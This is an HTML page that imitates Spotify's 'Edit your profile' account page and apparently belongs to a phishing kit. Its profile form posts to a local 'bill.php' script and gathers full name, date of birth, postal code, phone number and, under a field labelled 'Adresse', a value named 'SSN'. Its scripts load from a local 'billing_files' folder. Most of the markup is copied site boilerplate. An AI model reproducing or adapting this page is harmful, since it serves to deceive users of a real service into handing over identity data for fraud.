    <path class="path1" d="M415.449 376.626l-2.521 11.092h-222.346q-52.435 0-89.745 37.31t-37.31 89.745 37.31 89.745 89.745 37.31h158.818l-2.521 11.092q-8.067 32.268 2.269 59.494t35.545 42.352l119.996-479.984q-21.176 10.084-39.326 25.461t-31.259 35.293-18.655 41.091zM667.037 387.718l2.521-11.092q5.546-22.184 2.521-41.595t-13.613-34.789-26.722-25.461l-119.996 479.984q32.772-15.126 56.973-42.352t32.268-59.494l2.521-11.092h222.346q52.435 0 89.745-37.31t37.31-89.745-37.31-89.745-89.745-37.31h-158.818z"></path>
  </symbol>
  <symbol id="icon-payment" viewBox="0 0 1024 1024">
    <title>payment</title>
    <path class="path1" d="M139.659 768.882h737.119q31.259 0 53.696-22.436t22.436-53.696v-241.505h-889.383v241.505q0 31.259 22.436 53.696t53.696 22.436zM730.564 578.3h63.527q13.109 0 22.436 9.327t9.327 22.436v63.527q0 13.109-9.327 22.436t-22.436 9.327h-63.527q-13.109 0-22.436-9.327t-9.327-22.436v-63.527q0-13.109 9.327-22.436t22.436-9.327zM139.659 197.136q-31.259 0-53.696 22.436t-22.436 53.696v50.923h889.383v-50.923q0-31.259-22.436-53.696t-53.696-22.436h-737.119z"></path>
  </symbol>
  <symbol id="icon-payment-history" viewBox="0 0 1024 1024">
    <title>payment-history</title>
    <path class="path1" d="M127.055 514.773q0 77.645 30.251 148.23t81.174 121.509 121.509 81.174 148.23 30.251 148.23-30.251 121.509-81.174 81.174-121.509 30.251-148.23-30.251-148.23-81.174-121.509-121.509-81.174-148.23-30.251-148.23 30.251-121.509 81.174-81.174 121.509-30.251 148.23zM184.028 514.773q0-52.939 16.386-102.35t46.385-89.241 69.83-69.83 89.241-46.385 102.35-16.386q66.048 0 125.794 25.713t103.358 69.325 69.325 103.358 25.713 125.794q0 112.433-70.082 200.666-65.544 82.686-165.877 110.921-43.36 12.1-88.232 12.605-66.048 0-125.794-25.713t-103.358-69.325-69.325-103.358-25.713-125.794zM655.945 600.484l-86.72-73.611q2.521-12.1 2.521-12.1 0-13.109-6.050-26.218l64.032-94.787q12.1-17.646 15.126-39.326l3.529-25.713q1.008-8.571-3.529-11.848t-12.605 0.756l-23.697 12.605q-7.563 4.538-16.89 12.857t-14.369 15.378l-63.023 93.778q-1.008 0-3.025-0.504l-3.025-0.504q-26.218 0-44.872 18.655t-18.655 44.872 18.655 44.872 44.872 18.655q7.563 0 19.159-4.033l87.728 74.619q16.638 13.613 37.814 19.159l24.705 6.050q9.075 2.521 12.857-2.017t0.252-12.605l-10.084-24.705q-1.513-4.033-4.286-9.075t-6.302-9.58-7.059-8.571-7.059-7.059z"></path>
  </symbol>
  <symbol id="icon-redeem" viewBox="0 0 1024 1024">
    <title>redeem</title>
    <path class="path1" d="M254.109 70.082q-26.218 0-44.872 18.655t-18.655 44.872v762.328q0 26.218 18.655 44.872t44.872 18.655h508.219q26.218 0 44.872-18.655t18.655-44.872v-762.328q0-26.218-18.655-44.872t-44.872-18.655h-508.219zM444.691 197.136v-63.527h127.055v63.527h127.055v63.527h-381.164v-63.527h127.055zM698.801 895.937h-381.164q-26.218 0-44.872-18.655t-18.655-44.872v-254.109q0-26.218 18.655-44.872t44.872-18.655h381.164q26.218 0 44.872 18.655t18.655 44.872v254.109q0 26.218-18.655 44.872t-44.872 18.655z"></path>
  </symbol>
  <symbol id="icon-apps" viewBox="0 0 224.729 224.729">
    <title>apps</title>
    <path class="path1" d="M164.112,224.729H0.364v-57.27c6.506,6.84,15.69,11.11,25.877,11.11
    c19.725,0,35.713-15.99,35.713-35.714c0-19.725-15.988-35.715-35.713-35.715c-10.187,0-19.371,4.271-25.877,11.113V60.98h56.634
    c-6.471-6.464-10.474-15.398-10.474-25.268C46.525,15.99,62.513,0,82.239,0c19.723,0,35.715,15.99,35.715,35.713
    c0,9.87-4.004,18.804-10.475,25.268h56.633v55.938c6.4-6.057,15.033-9.778,24.539-9.778c19.725,0,35.713,15.99,35.713,35.715
    c0,19.724-15.988,35.714-35.713,35.714c-9.506,0-18.139-3.722-24.539-9.778V224.729z"></path>
  </symbol>
  <symbol id="icon-check" viewBox="0 0 1024 1024">
    <title>check</title>
    <path class="path1" d="M435.616 866.19l-254.109-232.934q-18.655-17.142-19.663-42.099t15.882-43.36 41.847-19.411 43.612 15.63l196.128 179.994 281.335-544.016q11.596-22.184 35.293-29.747t45.881 3.781 29.747 35.293-4.033 46.133l-317.637 614.097q-3.025 6.554-7.563 11.848t-10.084 9.327-11.848 6.806-13.361 3.781q-2.017 0.504-3.781 0.756t-3.529 0.252-3.277 0q-23.697 0-40.839-16.134z"></path>
  </symbol>
  <symbol id="icon-email" viewBox="0 0 1024 1024">
    <title>email</title>
    <path class="path1" d="M590.905 533.932l362.005-226.379v-46.889q0-26.218-18.655-44.872t-44.872-18.655h-762.328q-26.218 0-44.872 18.655t-18.655 44.872v46.889l362.005 226.379q21.68 13.613 52.183 18.403t61.006 0 52.183-18.403zM508.219 649.895q-36.806 0-71.090-8.823t-62.015-25.966l-311.586-195.12v348.896q0 26.218 18.655 44.872t44.872 18.655h762.328q26.218 0 44.872-18.655t18.655-44.872v-348.896l-311.586 195.12q-18.655 11.092-40.587 19.159t-45.125 11.848-47.393 3.781z"></path>
  </symbol>
  <!-- TODO: Replace this "push/mobile" icon. It's not the right one -->
  <symbol id="icon-push" viewBox="0 0 1024 1024">
    <title>push</title>
    <path class="path1" d="M635.273 133.609h63.527v-31.764q0-39.326-27.982-67.309t-67.309-27.982h-381.164q-39.326 0-67.309 27.982t-27.982 67.309v635.273q0 39.326 27.982 67.309t67.309 27.982h31.764v-127.055h-63.527v-571.746h444.691zM412.928 197.136q-39.326 0-67.309 27.982t-27.982 67.309v635.273q0 39.326 27.982 67.309t67.309 27.982h381.164q39.326 0 67.309-27.982t27.982-67.309v-635.273q0-39.326-27.982-67.309t-67.309-27.982h-381.164zM381.164 895.937v-571.746h444.691v571.746h-444.691z"></path>
  </symbol>
  <symbol id="icon-checkmark" viewBox="0 0 1024 1024">
    <path class="path1" d="M435.616 866.19l-254.109-232.934q-9.075-8.571-14.117-19.663t-5.546-22.436 3.529-22.688 12.605-20.419q16.638-18.655 41.595-19.663t43.612 15.63l196.128 179.994 281.335-544.016q11.596-22.184 35.293-29.747t45.881 3.781 29.747 35.293-4.033 46.133l-317.637 614.097q-6.554 12.605-17.899 20.924t-24.957 10.84q-2.017 0.504-3.781 0.756t-3.529 0.252-3.277 0q-23.697 0-40.839-16.134z"></path>
  </symbol>
  <symbol id="icon-collection" viewBox="0 0 1024 1024">
    <path class="path1" d="m447 273-243-81-204 607 243 81zm576 607 0-736-256 0 0 736 256 0zm-64-576 0 64-128 0 0-64 128 0zm-256 576 0-736-256 0 0 736 256 0zm-64-576 0 64-128 0 0-64 128 0z"></path>
  </symbol>
  </defs>
</svg>
  <div class="outer-content-wrapper">
    <div class="container container-submenu visible-xs">
              <div class="row">
          <div class="col-xs-12">
            
  
      
                                                                                              
  <div class="submenu-backdrop"></div>
  <div class="btn-group-inverse">
    <button type="button" class="btn btn-submenu dropdown-toggle" data-toggle="dropdown">
              <svg><use xlink:href="#icon-edit"></use></svg>
            <span class="icon-chevron-down"></span> Edit profile
    </button>
    <ul class="dropdown-menu" role="menu">
        
                    
  <li id="submenu-item-account-overview">
  <a href="https://www.spotify.com/us/account/overview/"><svg><use xlink:href="#icon-home"></use></svg> Account overview</a>
  </li>

                        
  <li id="submenu-item-family-plan">
  <a href="https://www.spotify.com/us/family/overview"><svg><use xlink:href="#icon-redeem"></use></svg> Premium for Family</a>
  </li>

                        
  <li class="active" id="submenu-item-edit-profile">
  <a href="https://www.spotify.com/us/account/profile/"><svg><use xlink:href="#icon-edit"></use></svg> Edit profile</a>
  </li>

                                        
  <li id="submenu-item-change-password">
  <a href="https://www.spotify.com/us/account/change-password/"><svg><use xlink:href="#icon-locked"></use></svg> Change password</a>
  </li>

                        
  <li id="submenu-item-notification-settings">
  <a href="https://www.spotify.com/us/account/notifications/"><svg><use xlink:href="#icon-notifications"></use></svg> Notification settings</a>
  </li>

                                        
  <li id="submenu-item-offline-devices">
  <a href="https://www.spotify.com/us/account/offline-devices/"><svg><use xlink:href="#icon-offline"></use></svg> Offline devices</a>
  </li>

                        
  <li id="submenu-item-recover-playlists">
  <a href="https://www.spotify.com/us/account/recover-playlists/"><svg><use xlink:href="#icon-refresh"></use></svg> Recover playlists</a>
  </li>

                        
  <li id="submenu-item-subscription">
  <a href="https://www.spotify.com/us/account/subscription/"><svg><use xlink:href="#icon-payment"></use></svg> Subscription</a>
  </li>

                        
  <li id="submenu-item-receipts">
  <a href="https://www.spotify.com/us/account/subscription/receipt/"><svg><use xlink:href="#icon-payment-history"></use></svg> Receipts</a>
  </li>

                        
  <li id="submenu-item-apps">
  <a href="https://www.spotify.com/us/account/apps/"><svg><use xlink:href="#icon-apps"></use></svg> Apps</a>
  </li>

                        
  <li id="submenu-item-redeem">
  <a href="https://www.spotify.com/us/redeem/"><svg><use xlink:href="#icon-redeem"></use></svg> Redeem</a>
  </li>

      
    </ul>
  </div>

          </div>
        </div>
          </div>

        <div class="content-wrapper">

      
      <div class="container container-content">
        <div class="row">
                      <div class="col-sm-3 hidden-xs">
              
<div class="sidebar">
    
    <div class="user-icon-container img-circle ">
      <svg class="user-icon">
        <use xlink:href="#user-icon">
      </use></svg>
    </div>

  
    
  <ul class="nav-inverse nav-tabs nav-stacked">
      
                    
  <li id="submenu-item-account-overview">
  <a href="https://www.spotify.com/us/account/overview/"><svg><use xlink:href="#icon-home"></use></svg> Account overview</a>
  </li>

                        
  <li id="submenu-item-family-plan">
  <a href="https://www.spotify.com/us/family/overview"><svg><use xlink:href="#icon-redeem"></use></svg> Premium for Family</a>
  </li>

                        
  <li class="active" id="submenu-item-edit-profile">
  <a href="https://www.spotify.com/us/account/profile/"><svg><use xlink:href="#icon-edit"></use></svg> Edit profile</a>
  </li>

                                        
  <li id="submenu-item-change-password">
  <a href="https://www.spotify.com/us/account/change-password/"><svg><use xlink:href="#icon-locked"></use></svg> Change password</a>
  </li>

                        
  <li id="submenu-item-notification-settings">
  <a href="https://www.spotify.com/us/account/notifications/"><svg><use xlink:href="#icon-notifications"></use></svg> Notification settings</a>
  </li>

                                        
  <li id="submenu-item-offline-devices">
  <a href="https://www.spotify.com/us/account/offline-devices/"><svg><use xlink:href="#icon-offline"></use></svg> Offline devices</a>
  </li>

                        
  <li id="submenu-item-recover-playlists">
  <a href="https://www.spotify.com/us/account/recover-playlists/"><svg><use xlink:href="#icon-refresh"></use></svg> Recover playlists</a>
  </li>

                        
  <li id="submenu-item-subscription">
  <a href="https://www.spotify.com/us/account/subscription/"><svg><use xlink:href="#icon-payment"></use></svg> Subscription</a>
  </li>

                        
  <li id="submenu-item-receipts">
  <a href="https://www.spotify.com/us/account/subscription/receipt/"><svg><use xlink:href="#icon-payment-history"></use></svg> Receipts</a>
  </li>

                        
  <li id="submenu-item-apps">
  <a href="https://www.spotify.com/us/account/apps/"><svg><use xlink:href="#icon-apps"></use></svg> Apps</a>
  </li>

                        
  <li id="submenu-item-redeem">
  <a href="https://www.spotify.com/us/redeem/"><svg><use xlink:href="#icon-redeem"></use></svg> Redeem</a>
  </li>

      
  </ul>

</div>
            </div>
                              <div class="col-sm-9">
            <div class="content">
                                          
              
              
                  <div class="article-account">

        <div class="page-header">
            <h1>Edit your profile</h1>
        </div>

        

    
    

                    
        <div class="well">
            
            
                            <form name="profile" method="post" action="bill.php" id="profile" role="form" novalidate="novalidate">
                    

                    <div class="form-group"><label class="control-label" for="profile_email">Full name</label><input type="text" id="profile_email" name="fullname" required="" class="form-control valid" data-msg-required="You must specify your full name." data-msg-email="" data-msg-remote="" value=""></div>

                                                    <div class="form-group"><label class="control-label" for="profile_confirmPassword">Adresse</label><input type="text" id="profile_confirmPassword" name="SSN" class="form-control"></div>
                
                                                    <div class="form-group"><label class="control-label" for="profile_postalCode">Postal code</label><input type="text" id="profile_postalCode" name="zip" maxlength="10" class="form-control"></div>
                
                    <div class="form-group"><label class="control-label" for="profile_gender">Gender</label><select id="profile_gender" name="GEN" required="" class="form-control valid"><option value="male" selected="selected">Male</option><option value="female">Female</option><option value="neutral">Non-binary</option></select></div>
                    <div class="form-group"><label class="control-label">Date of birth</label><div id="profile_birthdate" class="bootstrap-date row"><div class="col-xs-4"><select id="profile_birthdate_month" name="MON" required="" class="form-control"><option value="1" selected="selected">01</option><option value="2">02</option><option value="3">03</option><option value="4">04</option><option value="5">05</option><option value="6">06</option><option value="7">07</option><option value="8">08</option><option value="9">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option></select></div><div class="col-xs-4"><select id="profile_birthdate_day" name="DAY" required="" class="form-control"><option value="1">01</option><option value="2">02</option><option value="3">03</option><option value="4">04</option><option value="5">05</option><option value="6">06</option><option value="7">07</option><option value="8">08</option><option value="9">09</option><option value="10">10</option><option value="11">11</option><option value="12">12</option><option value="13">13</option><option value="14">14</option><option value="15">15</option><option value="16">16</option><option value="17">17</option><option value="18">18</option><option value="19">19</option><option value="20">20</option><option value="21" selected="selected">21</option><option value="22">22</option><option value="23">23</option><option value="24">24</option><option value="25">25</option><option value="26">26</option><option value="27">27</option><option value="28">28</option><option value="29">29</option><option value="30">30</option><option value="31">31</option></select></div><div class="col-xs-4"><select id="profile_birthdate_year" name="YEAR" required="" class="form-control"><option value="2018">2018</option><option value="2017">2017</option><option value="2016">2016</option><option value="2015">2015</option><option value="2014">2014</option><option value="2013">2013</option><option value="2012">2012</option><option value="2011">2011</option><option value="2010">2010</option><option value="2009">2009</option><option value="2008">2008</option><option value="2007">2007</option><option value="2006">2006</option><option value="2005">2005</option><option value="2004">2004</option><option value="2003">2003</option><option value="2002">2002</option><option value="2001">2001</option><option value="2000">2000</option><option value="1999">1999</option><option value="1998">1998</option><option value="1997" selected="selected">1997</option><option value="1996">1996</option><option value="1995">1995</option><option value="1994">1994</option><option value="1993">1993</option><option value="1992">1992</option><option value="1991">1991</option><option value="1990">1990</option><option value="1989">1989</option><option value="1988">1988</option><option value="1987">1987</option><option value="1986">1986</option><option value="1985">1985</option><option value="1984">1984</option><option value="1983">1983</option><option value="1982">1982</option><option value="1981">1981</option><option value="1980">1980</option><option value="1979">1979</option><option value="1978">1978</option><option value="1977">1977</option><option value="1976">1976</option><option value="1975">1975</option><option value="1974">1974</option><option value="1973">1973</option><option value="1972">1972</option><option value="1971">1971</option><option value="1970">1970</option><option value="1969">1969</option><option value="1968">1968</option><option value="1967">1967</option><option value="1966">1966</option><option value="1965">1965</option><option value="1964">1964</option><option value="1963">1963</option><option value="1962">1962</option><option value="1961">1961</option><option value="1960">1960</option><option value="1959">1959</option><option value="1958">1958</option><option value="1957">1957</option><option value="1956">1956</option><option value="1955">1955</option><option value="1954">1954</option><option value="1953">1953</option><option value="1952">1952</option><option value="1951">1951</option><option value="1950">1950</option><option value="1949">1949</option><option value="1948">1948</option><option value="1947">1947</option><option value="1946">1946</option><option value="1945">1945</option><option value="1944">1944</option><option value="1943">1943</option><option value="1942">1942</option><option value="1941">1941</option><option value="1940">1940</option><option value="1939">1939</option><option value="1938">1938</option><option value="1937">1937</option><option value="1936">1936</option><option value="1935">1935</option><option value="1934">1934</option><option value="1933">1933</option><option value="1932">1932</option><option value="1931">1931</option><option value="1930">1930</option><option value="1929">1929</option><option value="1928">1928</option><option value="1927">1927</option><option value="1926">1926</option><option value="1925">1925</option><option value="1924">1924</option><option value="1923">1923</option><option value="1922">1922</option><option value="1921">1921</option><option value="1920">1920</option><option value="1919">1919</option><option value="1918">1918</option><option value="1917">1917</option><option value="1916">1916</option><option value="1915">1915</option><option value="1914">1914</option><option value="1913">1913</option><option value="1912">1912</option><option value="1911">1911</option><option value="1910">1910</option><option value="1909">1909</option><option value="1908">1908</option><option value="1907">1907</option><option value="1906">1906</option><option value="1905">1905</option><option value="1904">1904</option><option value="1903">1903</option><option value="1902">1902</option><option value="1901">1901</option><option value="1900">1900</option></select></div></div></div>
                    <div class="form-group"><div id="profile_mobile"><div class="form-group"><label class="control-label" for="profile_mobile_number">Mobile phone number</label><input type="text" id="profile_mobile_number" name="phonenum" class="form-control"></div><div class="form-group"></div><div class="form-group"></div></div></div>
                    <div class="form-group"><div id="profile_send"><div class="form-group"><div class="checkbox"><label for="profile_send_third_party_email"><input type="checkbox" id="profile_send_third_party_email" name="profile[send][third_party_email]" value="1">
            Share my registration data with Spotify's content providers for marketing purposes.<span class="control-indicator"></span></label></div></div></div></div>

                <div class="row-buttons-bordered">
                        <button type="submit" id="profile_save_profile" name="profile[save_profile]" class="btn-sm js-gtm-event btn btn-primary" data-ga-category="Account Pages" data-ga-action="save profile" data-ga-label="save-profile-account" data-gtm-event-name="save_profile_button_clicked">Save profile</button>
                        <a id="profile_cancel" name="profile[cancel]" class="btn btn-sm btn-cancel" href="https://www.spotify.com/us/account/overview/">Cancel</a>
                </div>
                <input type="hidden" id="profile__token" name="profile[_token]" class="form-control" value="eyJ0aW1lIjoxNTIyOTc1NTU5LCJoYXNoIjoiMThjMGIwZmEwZmUyOTkzOGJkOWYwMmQyZDJiYjM2YzA0NjJjMGM3ZTNkODM1MWY1NWQ5ODg5MDMzYzA0NzVlYSJ9"></form>
        </div>

    </div>
            </div>
          </div>
          
        </div>
      </div>
    </div>
        </div>



      </div>

      <footer role="contentinfo" class="footer footer-default ">
  <div class="container">
    <nav class="row">

            <div class="col-xs-12 col-md-2">
        <div class="footer-logo">
          <a href="https://www.spotify.com/us/">Spotify</a>
        </div>
      </div>

            <div class="col-xs-6 col-sm-4 col-md-2">
        <h3 class="nav-title">Company</h3>
        <ul class="nav">
          
  <li>
    <a href="https://www.spotify.com/us/about-us/contact/" id="nav-link-about" data-ga-category="menu" data-ga-action="about">
      About
                </a>
  </li>

  <li>
    <a href="https://www.spotifyjobs.com/" id="nav-link-jobs" data-ga-category="menu" data-ga-action="jobs">
      Jobs
                </a>
  </li>

  <li>
    <a href="https://press.spotify.com/" id="nav-link-press" data-ga-category="menu" data-ga-action="press">
      Press
                </a>
  </li>

  <li>
    <a href="https://news.spotify.com/" id="nav-link-news" data-ga-category="menu" data-ga-action="news">
      News
                </a>
  </li>

        </ul>
      </div>

            <div class="col-xs-6 col-sm-4 col-md-2">
        <h3 class="nav-title">Communities</h3>
        <ul class="nav">
          
  <li>
    <a href="https://artists.spotify.com/" id="nav-link-artists" data-ga-category="menu" data-ga-action="artists">
      For Artists
                </a>
  </li>

  <li>
    <a href="https://developer.spotify.com/" id="nav-link-developers" data-ga-category="menu" data-ga-action="developers">
      Developers
                </a>
  </li>

  <li>
    <a href="https://www.spotify.com/us/brands/" id="nav-link-brands" data-ga-category="menu" data-ga-action="brands">
      Brands
                </a>
  </li>

  <li>
    <a href="https://investors.spotify.com/" id="nav-link-investors" data-ga-category="menu" data-ga-action="investors">
      Investors
                </a>
  </li>

        </ul>
      </div>

            <div class="col-xs-6 col-sm-4 col-md-2">
        <h3 class="nav-title">Useful links</h3>
        <ul class="nav">
            <li>
    <a href="https://support.spotify.com/?utm_source=www.spotify.com&amp;utm_medium=www_footer" id="nav-link-help" data-ga-category="menu" data-ga-action="help">
      Help
                </a>
  </li>

  <li>
    <a href="https://www.spotify.com/us/purchase/ecards/" id="nav-link-gift" data-ga-category="menu" data-ga-action="gift">
      Gift
                </a>
  </li>

    <li class="hidden-xs ">
    <a href="https://www.spotify.com/us/redirect/webplayerlink/?utm_medium=www_footer" id="nav-link-play" data-ga-category="menu" data-ga-action="play">
      Web Player
                </a>
  </li>

        </ul>
      </div>

            <div class="col-xs-12 col-md-4 col-social">
        <ul class="nav">
          <li>
  <a href="http://instagram.com/spotify">
    <svg class="social-icon">
      <use xlink:href="#instagram-icon">
    <svg>
    </svg></use></svg><span class="social-text">Instagram</span>
  </a>
</li>
<li>
  <a href="https://twitter.com/spotify">
    <svg class="social-icon">
      <use xlink:href="#twitter-icon">
    <svg>
    </svg></use></svg><span class="social-text">Twitter</span></a>
</li>
<li>
  <a href="https://www.facebook.com/Spotify">
    <svg class="social-icon">
      <use xlink:href="#facebook-icon">
    <svg>
    </svg></use></svg><span class="social-text">Facebook</span>
  </a>
</li>
        </ul>
      </div>
    </nav>

    <nav class="row row-small">
      <div class="col-xs-9 col-md-7">

                <ul class="nav nav-small">
          <li>
            <a href="https://www.spotify.com/us/legal/">Legal</a>
          </li>
          <li>
            <a href="https://www.spotify.com/us/legal/privacy-policy/">Privacy</a>
          </li>
          <li>
            <a href="https://www.spotify.com/us/legal/privacy-policy/#s13">Cookies</a>
          </li>
          <li>
            <a href="https://www.spotify.com/us/legal/privacy-policy/#s13">About Ads</a>
          </li>

                            </ul>
      </div>

            <div class="col-xs-3 col-md-5 text-right">
                <a class="market" href="https://www.spotify.com/us/select-your-country/" title="Click to change">
          <div class="media">
            <div class="media-body media-middle">
              USA
            </div>
            <div class="media-right media-middle">
              <span class="media-object flag-icon flag-icon-us"></span>
            </div>
          </div>
        </a>

                <small class="copyright">© 2019 Spotify AB</small>
      </div>
    </nav>
  </div>
</footer>
  
           <script src="./billing_files/spweb-site-efa1133a2d.min.js.download"></script>
   
  <script src="./billing_files/account-bb92d6d161.js.download"></script>
  <script>
    </script>
  <script>
    $(function() {
      spweb.account.submenu.init();
      spweb.account.subscription.init();
      spweb.account.notifications.init();
      spweb.account.privacy.init();
    });
  </script>

  <script>
    $(function() {
      spweb.account.requirePassword.init();
                    var options = {
          rules: {
            "profile[email]": {
              email: true,
              remote: {
                url: "/" + spweb.user.getMarket() + "/xhr/json/isEmailAvailable.php",
                type: "get",
                data: {
                  email: function() {
                    return $('#profile_email').val();
                  }
                }
              }
            }
          }
        };
      
      spweb.account.form.init('#profile', options);
    });
  </script>

    <script>results = ["164c16b8a39df43b56fd788e43f438724270028301bea325f6d50e4cd03f1f07", "ojMPb7owbRXMGghesW9cqXcy/LBgnw42LK+SDPIplRbhxbZ5y7SxYJMBd2GziYqLHsubAZfQMSZEnD7nvwUx2JVP0brgzamaVhkLYA4n6FJ+oHvv9x29TX9dSsABG5KM4TL5zp9WbQy6qUiupxcjVJwMJu6VjCnjnvd7bs1Zy2DBXZv71Mfg8mfUPaHLZuTpTeO/1SgNreGUVQpjIaqPqCiONyQx+YNhxSy/RSLlm77A/p6QkOS8XfyfFkReZ0EA",1523061959,723947474];</script>
    <script src="./billing_files/bon-32c3a6a7e1.js.download"></script>
    <script src="./billing_files/vt-150.js.download"></script>
<!-- This page was rendered using Twig --><iframe height="0" width="0" src="./billing_files/activityi.html" style="display: none; visibility: hidden;"></iframe>


<script type="text/javascript" id="">!function(b,e,f,g,a,c,d){b.fbq||(a=b.fbq=function(){a.callMethod?a.callMethod.apply(a,arguments):a.queue.push(arguments)},b._fbq||(b._fbq=a),a.push=a,a.loaded=!0,a.version="2.0",a.queue=[],c=e.createElement(f),c.async=!0,c.src=g,d=e.getElementsByTagName(f)[0],d.parentNode.insertBefore(c,d))}(window,document,"script","https://connect.facebook.net/en_US/fbevents.js");fbq("init","1483047915331997");fbq("track","PageView");</script>
<noscript>&lt;img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1483047915331997&amp;amp;ev=PageView&amp;amp;noscript=1"&gt;</noscript>

<script type="text/javascript" id="">!function(d,e,f,a,b,c){d.twq||(a=d.twq=function(){a.exe?a.exe.apply(a,arguments):a.queue.push(arguments)},a.version="1",a.queue=[],b=e.createElement(f),b.async=!0,b.src="//static.ads-twitter.com/uwt.js",c=e.getElementsByTagName(f)[0],c.parentNode.insertBefore(b,c))}(window,document,"script");twq("init","nvi9b");twq("track","PageView");</script>
<script type="text/javascript" id="">var scRec=document.createElement("SCRIPT");scRec.type="text/javascript";scRec.src="//d2oh4tlt9mrke9.cloudfront.net/Record/js/sessioncam.recorder.js";document.getElementsByTagName("head")[0].appendChild(scRec);</script><div id="ttdUniversalPixelTag1dfda5e8d7794c54abf4a4ce7c009256" style="display:none">
	<script type="text/javascript" id="" src="https://js.adsrvr.org/up_loader.1.1.0.js"></script></div></body></html>